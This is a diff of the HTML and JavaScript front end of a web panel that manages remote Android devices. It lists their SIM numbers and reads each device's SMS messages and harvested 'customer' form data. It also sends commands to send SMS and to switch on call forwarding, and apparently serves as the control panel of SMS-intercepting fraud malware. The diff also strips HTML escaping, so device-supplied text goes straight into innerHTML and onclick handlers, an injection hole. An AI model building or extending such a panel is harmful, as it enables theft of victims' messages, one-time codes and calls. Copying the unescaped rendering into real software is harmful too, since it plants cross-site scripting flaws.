@@ -29,7 +29,6 @@
         .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
         .card.online { border-top: 5px solid var(--success); }
         .card.pinned { border-top: 5px solid var(--primary); }
-        .status { font-size: 12px; font-weight: bold; color: #666; }
         .info { font-size: 13px; color: #444; margin-bottom: 5px; }
         .btns { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 15px; }
         .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
@@ -83,7 +82,7 @@
     <div id="viewDataModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>📋 Device Details</h2>
+                <h2 id="modalHeaderTitle">📋 Device Details</h2>
                 <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
             </div>
             <div id="modalBody"></div>
@@ -112,14 +111,8 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        function escapeAttr(str) {
-            if (str === undefined || str === null) return '';
-            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-        }
-
         const socket = io();
         let devices = [];
-        let currentOpenModal = null;
         let currentFilter = 'all';
 
         function toast(msg, err=false) {
@@ -147,29 +140,12 @@
                 const r = await fetch('/api/devices');
                 devices = await r.json();
                 render();
-                if (currentOpenModal) {
-                    if (document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') viewSms(currentOpenModal.deviceId, true);
-                    if (document.getElementById('viewDataModal').classList.contains('show')) {
-                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId, true);
-                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId, true);
-                    }
-                }
                 if (showMsg) toast('✅ Refresh Successful!');
             } catch (err) { toast('❌ Refresh failed', true); }
         }
 
         socket.on('dashboard-update', () => fetchData(false));
-        
-        socket.on('command-result', (res) => {
-            const statusBox = document.getElementById('cmdStatusBox');
-            if (statusBox) {
-                statusBox.style.display = 'block';
-                statusBox.style.background = res.success ? '#e8f5e9' : '#ffebee';
-                statusBox.style.color = res.success ? '#2e7d32' : '#c62828';
-                statusBox.innerText = (res.success ? '✅ ' : '❌ ') + (res.message || (res.success ? 'Command Successful' : 'Command Failed'));
-            }
-            toast(res.message || (res.success ? 'Success' : 'Failed'), !res.success);
-        });
+        socket.on('sms-list-update', () => fetchData(false)); // Auto refresh when new SMS arrives
 
         function filter(type, btn) {
             currentFilter = type;
@@ -185,11 +161,6 @@
             const diff = Math.floor((Date.now() - d) / 1000);
             if (diff < 60) return diff + 's ago';
             if (diff < 3600) return Math.floor(diff/60) + 'm ago';
-            if (diff < 86400) {
-                const h = Math.floor(diff / 3600);
-                const m = Math.floor((diff % 3600) / 60);
-                return `${h} hr ${m} min ago`;
-            }
             return d.toLocaleString();
         }
 
@@ -212,364 +183,135 @@
                 card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                 card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                 card.innerHTML = `
-                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d._id || d.deviceId}', ${!d.isPinned})"></i></div>
+                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i></div>
                     <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
-                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
+                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${d.model||''}</small></div>
                     <div class="info" style="text-align:center;">${statusBadge}</div>
-                    <div class="info"><b>SIM1:</b> ${escapeAttr(d.sim1||'N/A')}</div>
-                    <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
+                    <div class="info"><b>SIM1:</b> ${d.sim1||'N/A'}</div>
+                    <div class="info"><b>SIM2:</b> ${d.sim2||'N/A'}</div>
                     <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
                     <div class="btns">
-                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d._id || d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
-                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d._id || d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
-                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d._id || d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
-                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d._id || d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
-                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d._id || d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
-                        <button class="btn-sm btn-del" onclick="del('${d._id || d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewAction('${d.deviceId}', 'VIEW_DATA')"><i class="fas fa-eye"></i> VIEW DATA</button>
+                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewAction('${d.deviceId}', 'VIEW_SMS')"><i class="fas fa-envelope"></i> VIEW SMS</button>
+                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewAction('${d.deviceId}', 'VIEW_FORM')"><i class="fas fa-file-alt"></i> FORM DATA</button>
+                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
+                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                     </div>`;
                 grid.appendChild(card);
             });
         }
 
-        async function togglePin(id, s) {
-            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, status: s}) });
-            fetchData(false);
-        }
-
-        function del(deviceId) {
-            document.getElementById('actionModalTitle').innerText = 'Delete Device';
-            document.getElementById('actionModalBody').innerHTML = `
-                <div style="display:flex;flex-direction:column;gap:15px;">
-                    <div style="color:var(--danger);font-weight:bold;text-align:center;">Are you sure you want to delete this device?</div>
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER ADMIN PASSWORD:</label>
-                        <input type="password" id="delAdminPass" placeholder="Admin Password" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                    </div>
-                    <div id="cmdStatusBox" class="cmd-status"></div>
-                    <button class="btn-sm btn-del" onclick="submitDeleteDevice('${deviceId}')" style="width:100%;padding:12px;border-radius:5px;">DELETE DEVICE</button>
-                </div>
-            `;
-            document.getElementById('actionModal').classList.add('show');
-        }
-
-        async function submitDeleteDevice(deviceId) {
-            const password = document.getElementById('delAdminPass').value;
-            if (!password) { toast('Password is required', true); return; }
-
-            const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = 'Processing...';
+        async function viewAction(deviceId, action) {
+            const modalId = action === 'VIEW_SMS' ? 'viewSmsModal' : 'viewDataModal';
+            const bodyId = action === 'VIEW_SMS' ? 'smsModalBody' : 'modalBody';
+            const title = action === 'VIEW_DATA' ? '📋 Device Details' : action === 'VIEW_SMS' ? '📬 SMS Messages' : '📝 Form Data';
+            
+            if (action !== 'VIEW_SMS') document.getElementById('modalHeaderTitle').innerText = title;
+            document.getElementById(bodyId).innerHTML = '<div class="no-data">Loading cached data...</div>';
+            document.getElementById(modalId).classList.add('show');
 
             try {
-                const r = await fetch('/api/delete-device', { 
-                    method:'POST', 
-                    headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({ deviceId, password }) 
-                });
-                const d = await r.json();
-                if (d.success) {
-                    toast('Device Deleted Successfully');
-                    closeModal('actionModal');
-                    fetchData(false);
-                } else {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = '❌ ' + (d.message || 'Wrong Password');
-                    toast(d.message || 'Error', true);
+                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action }) });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    document.getElementById(bodyId).innerHTML = `<div class="no-data">${data.message}</div>`;
+                    return;
                 }
-            } catch (e) { 
-                statusBox.style.background = '#ffebee';
-                statusBox.style.color = '#c62828';
-                statusBox.innerText = '❌ Server Error';
-                toast('Error', true); 
-            }
-        }
 
-        async function viewData(deviceId, isRefresh = false) {
-            currentOpenModal = { type: 'data', deviceId };
-            if (!isRefresh) {
-                document.getElementById('modalBody').innerHTML = '<div class="no-data">Loading...</div>';
-                document.getElementById('viewDataModal').classList.add('show');
-            }
-            try {
-                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_DATA' }) });
-                const payload = await res.json();
-                const device = payload.device || devices.find(d => d.deviceId === deviceId || d._id === deviceId);
-                if (!device) { document.getElementById('modalBody').innerHTML = 'Device not found'; return; }
-                
-                const copyBtn = (text) => `<i class="fas fa-copy" style="color:#1976d2;cursor:pointer;margin-left:8px;" onclick="navigator.clipboard.writeText('${escapeAttr(text)}');toast('Copied')"></i>`;
-                
-                let html = `<div style="background:#e3f2fd;padding:18px;border-radius:12px;">
-                    <h3 style="margin-top:0;color:#1976d2;border-bottom:2px solid #1976d2;padding-bottom:10px;">Device Details</h3>`;
-                
-                const statusHtml = device.isOnline 
-                    ? `<span style="color:var(--success);font-weight:bold;">ONLINE</span>` 
-                    : `<span style="color:var(--danger);font-weight:bold;">OFFLINE</span>`;
+                if (data.isOnline) toast('Device is Online! Refreshing latest data...');
 
-                const fields = [
-                    ['1. MODEL', device.model || 'N/A'],
-                    ['2. SERIAL NUMBER', device.serialNumber || 'N/A'],
-                    ['3. SIM 1', (device.sim1 || 'N/A') + (device.sim1 ? copyBtn(device.sim1) : '')],
-                    ['4. SIM 2', (device.sim2 || 'N/A') + (device.sim2 ? copyBtn(device.sim2) : '')],
-                    ['5. ANDROID VERSION', device.androidVersion || 'N/A'],
-                    ['6. INSTALL DATE', device.registrationTimestamp ? new Date(device.registrationTimestamp).toLocaleString() : 'N/A'],
-                    ['7. LAST SEEN', formatLastSeen(device.lastSeen)],
-                    ['8. BATTERY', (device.battery || 0) + '%'],
-                    ['9. STATUS', statusHtml]
-                ];
+                if (action === 'VIEW_DATA') showDeviceData(data.device);
+                if (action === 'VIEW_FORM') showFormData(data.customerData);
+                if (action === 'VIEW_SMS') showSmsData(data.messages, deviceId);
 
-                fields.forEach(f => {
-                    html += `<div style="margin-bottom:8px;font-size:14px;display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding-bottom:4px;">
-                        <b style="color:#555;">${f[0]}:</b> 
-                        <span style="color:#333;font-weight:500;">${f[1]}</span>
-                    </div>`;
-                });
-
-                html += `<h3 style="margin-top:25px;color:#ff9800;border-bottom:2px solid #ff9800;padding-bottom:10px;">FORM SUBMITTED DETAIL</h3>`;
-                
-                const formData = device.customerData || {};
-                if (Object.keys(formData).length === 0) {
-                    html += `<div class="no-data">No form data submitted yet.</div>`;
-                } else {
-                    let i = 1;
-                    for (const [key, value] of Object.entries(formData)) {
-                        html += `<div style="margin-bottom:8px;font-size:14px;background:#fffde7;padding:12px;border-radius:8px;border-left:5px solid #ff9800;display:flex;justify-content:space-between;align-items:center;">
-                            <div><b style="color:#e65100;">${i++}. ${escapeAttr(key)}:</b> <span style="color:#333;">${escapeAttr(value)}</span></div>
-                            <i class="fas fa-copy" style="color:#ff9800;cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(value)}');toast('Copied')"></i>
-                        </div>`;
-                    }
-                }
-                
-                html += `</div>`;
-                document.getElementById('modalBody').innerHTML = html;
             } catch (e) { toast('Error fetching data', true); }
         }
 
-        async function viewFormData(deviceId, isRefresh = false) {
-            currentOpenModal = { type: 'form', deviceId };
-            if (!isRefresh) {
-                document.getElementById('modalBody').innerHTML = '<div class="no-data">Loading...</div>';
-                document.getElementById('viewDataModal').classList.add('show');
+        function showDeviceData(d) {
+            let html = `<div style="background:#e3f2fd;padding:15px;border-radius:8px;">`;
+            const fields = [['Model', d.model], ['Serial', d.serialNumber], ['Android', d.androidVersion], ['SIM 1', d.sim1], ['SIM 2', d.sim2], ['Battery', d.battery + '%'], ['Install Date', new Date(d.registrationTimestamp).toLocaleString()]];
+            fields.forEach(f => {
+                html += `<div style="display:flex;justify-content:space-between;border-bottom:1px solid #ddd;padding:8px 0;"><b>${f[0]}:</b> <span>${f[1]||'N/A'}</span></div>`;
+            });
+            html += `</div>`;
+            document.getElementById('modalBody').innerHTML = html;
+        }
+
+        function showFormData(data) {
+            let html = `<h3>Submitted Form Data</h3>`;
+            if (Object.keys(data).length === 0) html += `<div class="no-data">No form data found</div>`;
+            else {
+                Object.entries(data).forEach(([k, v]) => {
+                    html += `<div style="background:#fffde7;padding:12px;margin-bottom:8px;border-radius:8px;border-left:5px solid #ff9800;"><b>${k}:</b> ${v}</div>`;
+                });
             }
-            try {
-                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_FORM' }) });
-                const payload = await res.json();
-                const data = payload.customerData || (devices.find(d => d.deviceId === deviceId || d._id === deviceId)||{}).customerData || {};
-                
-                let html = `<h3 style="color:#ff9800;border-bottom:2px solid #ff9800;padding-bottom:10px;">Submitted Form Data</h3>`;
-                if (Object.keys(data).length === 0) {
-                    html += `<div class="no-data">No data found</div>`;
-                } else {
-                    let i = 1;
-                    Object.entries(data).forEach(([k, v]) => {
-                        html += `<div style="background:#fffde7;padding:12px;margin-bottom:8px;border-radius:8px;border-left:5px solid #ff9800;display:flex;justify-content:space-between;align-items:center;">
-                            <div><b>${i++}. ${escapeAttr(k)}:</b> ${escapeAttr(v)}</div>
-                            <i class="fas fa-copy" style="color:#ff9800;cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(v)}');toast('Copied')"></i>
-                        </div>`;
-                    });
-                }
-                document.getElementById('modalBody').innerHTML = html;
-            } catch (e) { toast('Error', true); }
+            document.getElementById('modalBody').innerHTML = html;
         }
 
-        async function viewSms(deviceId, isRefresh = false) {
-            currentOpenModal = { type: 'sms', deviceId };
-            if (!isRefresh) {
-                document.getElementById('smsModalBody').innerHTML = '<div class="no-data">Loading...</div>';
-                document.getElementById('viewSmsModal').classList.add('show');
+        function showSmsData(msgs, deviceId) {
+            if (msgs.length === 0) {
+                document.getElementById('smsModalBody').innerHTML = '<div class="no-data">No SMS found</div>';
+                return;
             }
-            try {
-                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_SMS' }) });
-                const payload = await res.json();
-                let msgs = payload.messages || (devices.find(d => d.deviceId === deviceId || d._id === deviceId)||{}).smsMessages || [];
-                msgs = msgs.slice(0, 50);
-                let html = msgs.map((m, idx) => `
-                    <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;align-items:center;">
-                        <div style="flex:1;">
-                            <div style="color:#1976d2;font-weight:bold;">${idx+1}. From: ${escapeAttr(m.from||m.address)}</div>
-                            <div style="margin:4px 0;">${escapeAttr(m.body||m.message)}</div>
-                            <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
-                        </div>
-                        <div style="display:flex;gap:15px;margin-left:10px;">
-                            <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(m.body||m.message)}');toast('Copied')"></i>
-                            <i class="fas fa-trash" style="color:var(--danger);cursor:pointer;" onclick="deleteSms('${deviceId}', '${escapeAttr(m.body||m.message)}', '${m.date||m.time}')"></i>
-                        </div>
-                    </div>`).join('');
-                document.getElementById('smsModalBody').innerHTML = html || '<div class="no-data">No SMS found</div>';
-            } catch (e) { toast('Error', true); }
+            let html = msgs.map((m, idx) => `
+                <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;">
+                    <div>
+                        <div style="color:#1976d2;font-weight:bold;">${idx+1}. From: ${m.address||m.from}</div>
+                        <div>${m.body||m.message}</div>
+                        <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
+                    </div>
+                    <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${m.body||m.message}');toast('Copied')"></i>
+                </div>`).join('');
+            document.getElementById('smsModalBody').innerHTML = html;
         }
 
-        async function deleteSms(deviceId, body, date) {
-            if (!confirm('Delete this SMS?')) return;
-            await fetch('/api/delete-sms', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, smsData: { body, date } }) });
-            viewSms(deviceId, true);
-        }
-
+        // --- Other functions (Send SMS, Call Fwd, Delete) same as before ---
         function showSendSmsModal(deviceId) {
             document.getElementById('actionModalTitle').innerText = 'Send SMS';
             document.getElementById('actionModalBody').innerHTML = `
-                <div style="display:flex;flex-direction:column;gap:15px;">
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">SELECT SIM:</label>
-                        <select id="smsSim" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                            <option value="1">SIM 1</option>
-                            <option value="2">SIM 2</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER RECIPIENT NUMBER:</label>
-                        <input type="text" id="smsNumber" placeholder="Recipient Number" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                    </div>
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER TEXT:</label>
-                        <textarea id="smsText" rows="5" placeholder="Enter message text here..." style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;"></textarea>
-                    </div>
-                    <div id="cmdStatusBox" class="cmd-status"></div>
-                    <button class="btn-gold" onclick="sendSmsCommand('${deviceId}')" style="width:100%;padding:12px;border-radius:5px;">SEND SMS</button>
-                </div>
-            `;
+                <input type="text" id="smsNumber" placeholder="Recipient Number" style="width:90%;padding:10px;margin-bottom:10px;">
+                <textarea id="smsText" rows="4" placeholder="Message" style="width:90%;padding:10px;"></textarea>
+                <button class="btn-gold" onclick="act('${deviceId}', 'SEND_SMS')" style="width:100%;margin-top:10px;">SEND</button>`;
             document.getElementById('actionModal').classList.add('show');
-        }
-
-        async function sendSmsCommand(deviceId) {
-            const sim = document.getElementById('smsSim').value;
-            const number = document.getElementById('smsNumber').value.trim();
-            const text = document.getElementById('smsText').value.trim();
-            if (!number || !text) { toast('All fields are required', true); return; }
-            
-            const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = 'Sending command to device...';
-
-            try {
-                const res = await fetch('/api/command', { 
-                    method:'POST', 
-                    headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({ deviceId, action:'SEND_SMS', data:{ number, message:text, simSlot:sim } }) 
-                });
-                const d = await res.json();
-                if (!d.success) {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = '❌ ' + (d.message || 'Error');
-                }
-            } catch (e) { toast('Error', true); }
         }
 
         function showCallForwardModal(deviceId) {
             document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
             document.getElementById('actionModalBody').innerHTML = `
-                <div style="display:flex;flex-direction:column;gap:15px;">
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">SELECT SIM:</label>
-                        <select id="cfSim" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                            <option value="1">SIM 1</option>
-                            <option value="2">SIM 2</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER TARGET NUMBER:</label>
-                        <input type="text" id="cfNumber" placeholder="Target Number" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                    </div>
-                    <div id="cmdStatusBox" class="cmd-status"></div>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
-                        <button class="btn-sm btn-sms" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_ACTIVATE')" style="padding:12px;">ACTIVE</button>
-                        <button class="btn-sm btn-del" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_DEACTIVATE')" style="padding:12px;">DEACTIVE</button>
-                    </div>
-                    <button class="btn-sm btn-call" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_STATUS')" style="width:100%;padding:12px;">CHECK STATUS</button>
-                </div>
-            `;
+                <input type="text" id="cfNumber" placeholder="Target Number" style="width:90%;padding:10px;margin-bottom:10px;">
+                <button class="btn-sm btn-sms" onclick="act('${deviceId}', 'CALL_FORWARD_ACTIVATE')" style="width:100%;margin-bottom:5px;">ACTIVATE</button>
+                <button class="btn-sm btn-del" onclick="act('${deviceId}', 'CALL_FORWARD_DEACTIVATE')" style="width:100%;">DEACTIVATE</button>`;
             document.getElementById('actionModal').classList.add('show');
         }
 
-        async function callFwdCommand(deviceId, action) {
-            const sim = document.getElementById('cfSim').value;
-            const number = document.getElementById('cfNumber').value.trim();
-            if (action === 'CALL_FORWARD_ACTIVATE' && !number) { toast('Target number required', true); return; }
-
-            const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = 'Sending command to device...';
-
-            try {
-                const res = await fetch('/api/command', { 
-                    method:'POST', 
-                    headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({ deviceId, action, data:{ number, simSlot:sim } }) 
-                });
-                const d = await res.json();
-                if (!d.success) {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = '❌ ' + (d.message || 'Error');
-                }
-            } catch (e) { toast('Error', true); }
-        }
-
-        function changePass() {
-            document.getElementById('actionModalTitle').innerText = 'Change Admin Password';
-            document.getElementById('actionModalBody').innerHTML = `
-                <div style="display:flex;flex-direction:column;gap:15px;">
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER OLD PASSWORD:</label>
-                        <input type="password" id="oldPass" placeholder="Old Password" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                    </div>
-                    <div>
-                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER NEW PASSWORD:</label>
-                        <input type="password" id="newPass" placeholder="New Password" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
-                    </div>
-                    <div id="cmdStatusBox" class="cmd-status"></div>
-                    <button class="btn-gold" onclick="submitPasswordChange()" style="width:100%;padding:12px;border-radius:5px;">PROCEED</button>
-                </div>
-            `;
-            document.getElementById('actionModal').classList.add('show');
-        }
-
-        async function submitPasswordChange() {
-            const oldPassword = document.getElementById('oldPass').value;
-            const newPassword = document.getElementById('newPass').value;
-            if (!oldPassword || !newPassword) { toast('Both fields are required', true); return; }
-
-            const statusBox = document.getElementById('cmdStatusBox');
-            statusBox.style.display = 'block';
-            statusBox.style.background = '#e3f2fd';
-            statusBox.style.color = '#1976d2';
-            statusBox.innerText = 'Processing...';
-
-            try {
-                const r = await fetch('/api/change-password', { 
-                    method:'POST', 
-                    headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({ oldPassword, newPassword }) 
-                });
-                const d = await r.json();
-                if (d.success) {
-                    statusBox.style.background = '#e8f5e9';
-                    statusBox.style.color = '#2e7d32';
-                    statusBox.innerText = '✅ Password Change Successful';
-                    toast('Password Changed Successfully');
-                    setTimeout(() => closeModal('actionModal'), 1500);
-                } else {
-                    statusBox.style.background = '#ffebee';
-                    statusBox.style.color = '#c62828';
-                    statusBox.innerText = '❌ ' + (d.message || 'Failed');
-                    toast(d.message || 'Error', true);
-                }
-            } catch (err) { 
-                statusBox.style.background = '#ffebee';
-                statusBox.style.color = '#c62828';
-                statusBox.innerText = '❌ Server Error';
-                toast('Error', true); 
+        async function act(deviceId, action) {
+            const data = {};
+            if (action === 'SEND_SMS') {
+                data.number = document.getElementById('smsNumber').value;
+                data.message = document.getElementById('smsText').value;
             }
+            if (action === 'CALL_FORWARD_ACTIVATE') data.number = document.getElementById('cfNumber').value;
+
+            const res = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data }) });
+            const d = await res.json();
+            toast(d.message || (d.success ? 'Command Sent' : 'Device Offline'), !d.success);
+            if (d.success) closeModal('actionModal');
         }
 
-        function closeModal(id) { document.getElementById(id).classList.remove('show'); currentOpenModal = null; }
+        async function togglePin(id, status) {
+            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) });
+            fetchData(false);
+        }
+
+        function del(deviceId) {
+            const p = prompt("Admin Password:");
+            if (!p) return;
+            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, password: p }) }).then(() => fetchData(false));
+        }
+
+        function closeModal(id) { document.getElementById(id).classList.remove('show'); }
     </script>
 </body>
 </html>
